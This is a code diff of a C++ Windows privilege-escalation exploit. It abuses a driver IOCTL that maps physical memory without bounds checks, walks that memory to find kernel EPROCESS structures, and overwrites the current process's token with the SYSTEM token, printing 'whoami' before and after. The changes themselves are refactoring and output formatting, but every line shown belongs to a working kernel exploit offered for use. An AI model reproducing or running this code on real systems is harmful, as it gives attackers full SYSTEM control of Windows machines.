@@ -47,12 +47,12 @@ struct process
     DWORD64 pid;
 };
 
-
-DWORD64 read_u64(DWORD64 address)
+template <typename T>
+T read(DWORD64 address)
 {
     __try
     {
-        return *(volatile DWORD64*)address;
+        return *(volatile T*)address;
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
@@ -60,11 +60,12 @@ DWORD64 read_u64(DWORD64 address)
     }
 }
 
-bool write_u64(DWORD64 address, DWORD64 value)
+template <typename T>
+bool write(DWORD64 address, T& value)
 {
     __try
     {
-        *(volatile DWORD64*)address = value;
+        *(volatile T*)address = value;
         return true;
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
@@ -76,24 +77,17 @@ bool write_u64(DWORD64 address, DWORD64 value)
 void print_process_name(DWORD64 address)
 {
     char name_buffer[16]{};
-    __try
+    for (size_t i = 0; i < 15; ++i)
     {
-        for (int i = 0; i < 15; i++)
-        {
-            char c = *(volatile char*)(address + i);
-            if (c == 0)
-                break;
-            if (c >= 32 && c <= 126)
-                name_buffer[i] = c;
-            else
-                name_buffer[i] = '.';
-        }
-        std::cout << "Name: " << name_buffer << " ";
+        char c = read<char>(address + i);
+        if (c == 0)
+            break;
+        if (c >= 32 && c <= 126)
+            name_buffer[i] = c;
+        else
+            name_buffer[i] = '.';
     }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        std::cout << "Failed ";
-    }
+    std::cout << "Name: " << name_buffer << " ";
 }
 
 int main()
@@ -102,13 +96,13 @@ int main()
 
     if (driver_handle == INVALID_HANDLE_VALUE)
     {
-        std::cout << "Failed to grab driver handle.\n";
-        std::cout << "Press enter to exit.\n";
+        std::cout << "[-] Failed to grab driver handle.\n";
+        std::cout << "[*] Press enter to exit.\n";
         std::cin.get();
         return 1;
     }
 
-    std::cout << "Grabbed driver handle.\n\n";
+    std::cout << "[+] Grabbed driver handle.\n\n";
 
     process current_proc{};
     current_proc.pid = GetCurrentProcessId();
@@ -124,25 +118,25 @@ int main()
     if (GetPhysicallyInstalledSystemMemory(&total_ram_kb))
     {
         map_size = total_ram_kb * 1024;
-        std::cout << "Physical RAM: " << std::dec << (total_ram_kb / (1024 * 1024)) << " GB (0x" << std::hex << map_size << " bytes)\n";
+        std::cout << "[*] Physical RAM: " << std::dec << (total_ram_kb / (1024 * 1024)) << " GB (0x" << std::hex << map_size << " bytes)\n";
     }
     else
     {
-        std::cout << "Failed to get physical RAM size. Defaulting 8 GB.\n";
+        std::cout << "[-] Failed to get physical RAM size. Defaulting 8 GB.\n";
     }
 
     map_request read_req{};
     read_req.size = map_size - PHYSICAL_READ_BASE; // ZwMapViewOfSection argument 7. no checks in the driver. can be used to map entire physical memory
     read_req.phys_addr = PHYSICAL_READ_BASE; // lowest address in driver bound check
 
-    std::cout << "Requesting memory map.\n";
+    std::cout << "[*] Requesting memory map.\n";
     DWORD bytes = 0;
     if (DeviceIoControl(driver_handle, IOCTL_MAP_PHYS_MEM, &read_req, sizeof(map_request), &read_req, sizeof(map_request), &bytes, NULL))
     {
         DWORD64 map_base_va = read_req.section_base_va;
         if (map_base_va)
         {
-            std::cout << "Map base VA found at 0x" << std::hex << map_base_va << ". Starting physical memory walk.\n\n";
+            std::cout << "[+] Map base VA found at 0x" << std::hex << map_base_va << ". Starting physical memory walk.\n\n";
 
             int found_count = 0;
 
@@ -150,47 +144,48 @@ int main()
 
             for (DWORD64 offset = 0; offset < end_offset; offset += 8) // physical memory walk
             {
-                DWORD64 current_addr = map_base_va + offset;
+                DWORD64 current_mapped_va = map_base_va + offset;
 
                 __try
                 {
-                    DWORD64 pid = *(volatile DWORD64*)current_addr;
+                    DWORD64 pid = *(volatile DWORD64*)current_mapped_va;
                     if (pid >= 4 && pid <= 0xA0000 && (pid % 4 == 0)) // check if pid is valid and multiple of 4
                     {
-                        DWORD64 eprocess_base = current_addr - EPROCESS_UNIQUEPID_OFFSET;
+                        DWORD64 eprocess_base = current_mapped_va - EPROCESS_UNIQUEPID_OFFSET;
 
-                        if (*(volatile DWORD64*)(eprocess_base + EPROCESS_EXITTIME_OFFSET) != 0)
+                        DWORD64 exit_time = read<DWORD64>(eprocess_base + EPROCESS_EXITTIME_OFFSET);
+                        if (exit_time)
                             continue; // if ExitTime != 0, the process has been terminated
 
-                        DWORD64 create_time = *(volatile DWORD64*)(eprocess_base + EPROCESS_CREATETIME_OFFSET);
+                        DWORD64 create_time = read<DWORD64>(eprocess_base + EPROCESS_CREATETIME_OFFSET);
                         if (create_time < TIMESTAMP_MIN || create_time > TIMESTAMP_MAX)
                             continue; // check if CreateTime isn't in valid bounds
-
-                        DWORD64 flink = *(volatile DWORD64*)(eprocess_base + EPROCESS_ACTIVELINKS_OFFSET);
+                        
+                        DWORD64 flink = read<DWORD64>(eprocess_base + EPROCESS_ACTIVELINKS_OFFSET);
                         if ((flink & 0xFFFF000000000000) != 0xFFFF000000000000)
-                            continue; // check if link entry is not in valid kernel address space
+                            continue; // check if next list entry is not in valid kernel address space
 
-                        DWORD64 token = *(volatile DWORD64*)(eprocess_base + EPROCESS_TOKEN_OFFSET);
+                        DWORD64 token = read<DWORD64>(eprocess_base + EPROCESS_TOKEN_OFFSET);
                         if ((token & 0xFFFF000000000000) != 0xFFFF000000000000)
                             continue; // check if token is not in valid kernel address space
 
-                        DWORD64 dir_base = *(volatile DWORD64*)(eprocess_base + KPROCESS_DIRECTORYTABLEBASE_OFFSET);
+                        DWORD64 dir_base = read<DWORD64>(eprocess_base + KPROCESS_DIRECTORYTABLEBASE_OFFSET);
                         if (dir_base == 0 || (dir_base & 0xFFF) != 0 || (dir_base & 0xFFFF000000000000) != 0)
                             continue; // check if cr3 is valid
 
-                        char first_char = *(volatile char*)(eprocess_base + EPROCESS_IMAGEFILENAME_OFFSET);
+                        char first_char = read<char>(eprocess_base + EPROCESS_IMAGEFILENAME_OFFSET);
                         if (first_char < 32 || first_char > 126)
                             continue; // check if ImageFileName is valid
 
                         // passed validation checks, found eprocess
                         found_count++;
                         DWORD64 eprocess_phys_address = (PHYSICAL_READ_BASE + offset) - EPROCESS_UNIQUEPID_OFFSET;
-                        DWORD64 process_virtual_base = *(volatile DWORD64*)(eprocess_base + EPROCESS_BASEADDRESS_OFFSET);
+                        DWORD64 process_virtual_base = read<DWORD64>(eprocess_base + EPROCESS_BASEADDRESS_OFFSET);
 
-                        std::cout << "PID: " << std::dec << pid << " ";
+                        std::cout << "[*] PID: " << std::dec << pid << " ";
                         print_process_name(eprocess_base + EPROCESS_IMAGEFILENAME_OFFSET);
                         std::cout << "EPROCESS Phys: 0x" << std::hex << eprocess_phys_address << " ";
-                        std::cout << "Virt Base: 0x" << std::hex << process_virtual_base;
+                        std::cout << "Base VA: 0x" << std::hex << process_virtual_base;
                         std::cout << "\n";
 
                         if (pid == current_proc.pid && !found_target)
@@ -216,18 +211,18 @@ int main()
                     offset = (offset & ~0xFFFULL) + 0x1000 - 8;
                 }
             }
-            std::cout << "Completed physical memory walk. Found " << std::dec << found_count << " processes.\n\n";
+            std::cout << "[+] Completed physical memory walk. Found " << std::dec << found_count << " processes.\n\n";
 
         }
         else
         {
-            std::cout << "Map base VA not found.\n";
+            std::cout << "[-] Map base VA not found.\n";
         }
     }
     else
     {
-        std::cout << "Failed to retrieve map base VA.\n";
-        std::cout << "Press enter to exit. Exiting may take long due to the unmapping process.\n";
+        std::cout << "[-] Failed to retrieve map base VA.\n";
+        std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
         CloseHandle(driver_handle);
         std::cin.get();
         return 1;
@@ -235,8 +230,8 @@ int main()
 
     if (!found_system)
     {
-        std::cout << "System process not found.\n";
-        std::cout << "Press enter to exit. Exiting may take long due to the unmapping process.\n";
+        std::cout << "[-] System process not found.\n";
+        std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
         CloseHandle(driver_handle);
         std::cin.get();
         return 1;
@@ -244,45 +239,44 @@ int main()
 
     if (!found_target)
     {
-        std::cout << "Current process not found. Try again.\n";
-        std::cout << "Press enter to exit. Exiting may take long due to the unmapping process.\n";
+        std::cout << "[-] Current process not found. Try again.\n";
+        std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
         CloseHandle(driver_handle);
         std::cin.get();
         return 1;
     }
 
-    std::cout << "Current privilege: ";
+    std::cout << "[*] Current privilege: ";
     system("cmd.exe /c whoami");
+    std::cout << "[*] Current process token: " << std::hex << current_proc.token << "\n\n";
 
-    std::cout << "\nStealing system token...\n";
-    std::cout << "Current process token: " << std::hex << current_proc.token << "\n";
-    std::cout << "System token: " << std::hex << system_proc.token << "\n";
+    std::cout << "[*] System token: " << std::hex << system_proc.token << "\n";
+    std::cout << "[*] Stealing system token...\n\n";
 
-    if (write_u64(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET, system_proc.token))
+    if (write<DWORD64>(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET, system_proc.token))
     {
-        DWORD64 verify = read_u64(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET);
+        DWORD64 verify = read<DWORD64>(current_proc.eprocess_va + EPROCESS_TOKEN_OFFSET);
         if (verify == system_proc.token)
         {
-            std::cout << "New process token: " << std::hex << verify << "\n\n";
-            std::cout << "System token is stolen.\n";
+            std::cout << "[+] System token is stolen.\n";
+            std::cout << "[*] New process token: " << std::hex << verify << "\n";
         }
         else
         {
-            std::cout << "Token stealing failed.\n";
+            std::cout << "[-] Token stealing failed.\n";
             CloseHandle(driver_handle);
             std::cin.get();
             return 1;
         }
     }
 
-    std::cout << "New privilege: ";
+    std::cout << "[*] New privilege: ";
     system("cmd.exe /c whoami");
 
     CloseHandle(driver_handle);
 
-    std::cout << "Press enter to exit. Exiting may take long due to the unmapping process.\n";
+    std::cout << "[*] Press enter to exit. Exiting may take long due to the unmapping process.\n";
 
     std::cin.get();
-
     return 0;
 }
